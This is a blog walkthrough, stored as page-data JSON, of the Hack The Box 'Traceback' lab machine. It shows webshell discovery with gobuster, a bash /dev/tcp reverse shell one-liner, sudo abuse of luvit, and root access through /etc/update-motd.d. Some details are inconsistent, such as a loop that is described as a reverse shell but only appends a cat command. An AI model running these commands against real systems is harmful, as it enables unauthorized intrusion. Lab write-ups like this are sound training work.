{"componentChunkName":"component---src-components-blog-entry-js","path":"/2020-07-31-HTB-Traceback/","result":{"data":{"markdownRemark":{"html":"<p>We'll start things off with a NMAP scan. The scan reveals only 2 ports are opened.</p>\n<pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)\n|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)\n|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Help us\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n<p>Viewing the page hosted on port 80 we see an a message that gives us an hint toward a foothold. There is already a webshell running.</p>\n<p><img src=\"/static/landingpage-67275d9021c8c83c80b8468fff61bc34.png\" alt=\"landingpage\"></p>\n<p>Next step we can enumerate this website with gobuster. Using the \"common\" and \"big\" dirb word-list yielded no result.</p>\n<p>Looking up the moniker used to signed the page (Xh4H), we can find a github repo of a user going by the same name that contains a list of web shells. We can generate a list of all the shells and try them individually.</p>\n<pre><code>/webshells.txt\nalfa3.php\nalfav3.0.1.php\nandela.php\nbloodsecv4.php\nby.php\nc99ud.php\ncmd.php\nconfigkillerionkros.php\njspshell.jsp\nmini.php\nobfuscated-punknopass.php\npunk-nopass.php\npunkholic.php\nr57.php\nsmevk.php\nwso2.8.5.php\n</code></pre>\n<p>I am kidding of course, we will pass this list to gobuster.</p>\n<pre><code>kali@kali:~/HTB/Traverxec$ gobuster dir -u http://traceback.htb/ -w ./webshells.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://traverxec.htb/\n[+] Threads:        10\n[+] Wordlist:       ./webshells.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/07/28 03:08:05 Starting gobuster\n===============================================================\n/smevk.php (Status: 200)\n===============================================================\n</code></pre>\n<p>The web shell being used is revealed to be \"smevk.php\". With this at hand we can navigate to the web shell and login with the default username and password.</p>\n<p><img src=\"/static/login-ef7e5235dee474a05e4cde6ae7573a8c.png\" alt=\"webshell login\"></p>\n<p>We can use this web-shell to initiate a reverse shell. Assuming netcat is already listening, we can execute the following command.</p>\n<p><code>nohup bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;your ip here>/&#x3C;port here> 0>&#x26;1'</code></p>\n<p><img src=\"/static/webshell-69249294222452375349393e03ffcc4b.png\" alt=\"webshell\"></p>\n<p>When we get the shell we see it is under the user <code>webadmin</code> . From here we can start poking around. In the home directory of this user there is a text file that gives an hint toward privilege escalation.</p>\n<pre><code>webadmin@traceback:/home/webadmin$ ls\nls\nnote.txt\nwebadmin@traceback:/home/webadmin$ less note.txt\nless note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\nwebadmin@traceback:/home/webadmin$\n</code></pre>\n<p>This bit led me to check what binaries the user webadmin can execute as other users</p>\n<pre><code>sudo -l\nMatching Defaults entries for webadmin on traceback:\nenv_reset, mail_badpass,\nsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n(sysadmin) NOPASSWD: /home/sysadmin/luvit\nwebadmin@traceback:/home/webadmin$\n</code></pre>\n<p>luvit is a cli tool that is used to execute lua script. Since we can execute it as another user user can user it to execute a shell with the owning user's context; in this case sysadmin.</p>\n<pre><code>webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute(\"/bin/sh\")'\n&#x3C;min /home/sysadmin/luvit -e 'os.execute(\"/bin/sh\")'\nsh: turning off NDELAY mode\nls\nnote.txt\ncd ..\nls\nsysadmin\nwebadmin\ncd sysadmin\nls\nluvit\nuser.txt\nid\nuid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)\n</code></pre>\n<p>Moving on now to the root flag. For a better shell experience you can add a public key and then ssh into the box. For enumeration at this point, I used linpeas and pspy. pspy reveals a cp operation that happens periodically into /etc/update-motd.d/</p>\n<p>The content of this directory are executed as root; explained here.</p>\n<blockquote>\n<p>Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at\n  each login, and this information is concatenated in /run/motd.dynamic. The order of\n  script execution is determined by the run-parts(8) --lsbsysinit option (basically\n  alphabetical order, with a few caveats).</p>\n</blockquote>\n<p>The goal here is to get a bash script into the source directory for it to be copied into <code>/etc/update-motd.d/</code></p>\n<pre><code>020/07/28 22:45:31 CMD: UID=0    PID=1668   | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/\n</code></pre>\n<p>For this exploit, I created a crude bash script that periodically write a reverse shell command to a file in the source directory.</p>\n<pre><code>for i in `seq 1 20`\ndo\necho 'cat /root/root.txt' >> /etc/update-motd.d/00-header &#x26;&#x26; cat /etc/update-motd.d/00-header\nsleep 3\ndone\n</code></pre>\n<p>This command is executed as root whenever a user ssh into the box and we get a shell.</p>\n<pre><code>kali@kali:~/HTB/Traceback$ nc -lvnp 1337\nlistening on [any] 1337 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.10.181] 54158\nbash: cannot set terminal process group (3013): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@traceback:/# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@traceback:/# cd /root\ncd /root\nroot@traceback:/root# ls\nls\nroot.txt\nroot@traceback:/root#\n</code></pre>","frontmatter":{"path":"/htb-traceback","title":"Hack The Box - Traceback","date":"07/31/2020","featuredImage":{"childImageSharp":{"fluid":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAACr0lEQVQoz2Pg4xfk4eHl5ePn5ORlYuBkYuACImZGLm6QIB8PLwIBRYAIKAFEQAZQhAGojU+An4OVR1xKxC5Gyy9HyydX2zxAVYBfgJODBygF0cnHLyAsIgpEYuLiQJJfQBCon4FPQICVidvARal8jmVDmtLkOt9ZubadpVq5s6wUtaXYWbj5+PmB6gSFhPX09M0tLG1s7SwsrWRk5Tm5uBnYWXk0zOUaFlpPkuBYHxC2c/WSeU2Ny3lEp1iJly20lZAV4eTglpCRlZZXklVQVlRV19HTU1HXkldWk5KVZ+Dm4s+cbNWuyX08t+jN04u39q3dt7jzqoXeNgaGzkSN4EpDVgZuUQkJWQWQZqAGXX1VGQUFcSkZETFxBjltqdqJZgsZGF5P7//z/OznU5v/LW34Ii16koF5mpRg8UQzAVFBfn4hCWkZIAJqEJYUFBQR5hcU4RcUZtC0VWyo0QXac09e5u7qBR9OrHrYV3BDUf4UD89aNpaqiRYicsLiErKKqhoaOvoqGtqq2qoKyupAroyCEoOsjlRTj0mfjeXy2pzvB5d9OLfn6KZllVnxNb5uE0w1S3qNBcSFebj5hEREJaVlhYRFgOEtJi4pJiEJDH8GLi6+3MlW5dXh9fmZH7ZPP7xj07Qp/bEBzq7WTsXN3hFleiyMPBLS0pDQUlRRV1LTVNXQVtPUBQUYOxuvloVM8yqXvPTADP+A2rycGF8/TzPr+CT7isV20opiHOw8ohKSEtKyQCQpIwfUIy2nICOvJCYpzQBKIWw8pm6KFQvtS7vci6q8UvLsi3udi2ZZqRtKA3XyAuMZmKRAqYoHkrxAiIsbKMLAw8cPTD+szNzAKHWJVQsr0w8t0bMNURYUFgQmAbQUioZAyRNIAY3n4uIFJmlWRh6gJ1mYuDHTNiYCAG+lmimJuvC0AAAAAElFTkSuQmCC","aspectRatio":1.5748031496062993,"src":"/static/4dd4602f2ec4bdbbf2a74e54f9d19e96/a2076/traceback.png","srcSet":"/static/4dd4602f2ec4bdbbf2a74e54f9d19e96/69585/traceback.png 200w,\n/static/4dd4602f2ec4bdbbf2a74e54f9d19e96/497c6/traceback.png 400w,\n/static/4dd4602f2ec4bdbbf2a74e54f9d19e96/a2076/traceback.png 599w","sizes":"(max-width: 599px) 100vw, 599px"}}}}}},"pageContext":{}}}